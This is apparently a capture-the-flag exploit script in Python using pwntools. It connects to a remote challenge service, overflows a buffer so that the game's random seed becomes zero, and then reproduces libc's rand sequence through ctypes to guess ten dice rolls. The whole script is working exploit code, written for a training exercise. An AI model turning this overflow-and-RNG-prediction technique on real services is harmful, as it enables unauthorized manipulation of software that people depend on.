from pwn import *

#sh = process('./pwn')
sh = remote('111.200.241.244', 63981)
context.binary = './pwn'
e = ELF('./pwn')
#context.log_level = 'debug'


import ctypes

libc = ctypes.cdll.LoadLibrary('/usr/lib/libc-2.33.so')

libc.srand(0)

payload = b'a'*0x20 + p32(0)

sh.sendline(payload)
sh.recv()

for i in range(10):
    print(sh.recvuntil(b'number:'))
    sh.sendline(str(libc.rand()%6+1).encode("utf-8"))

print(sh.recvall())
sh.close()
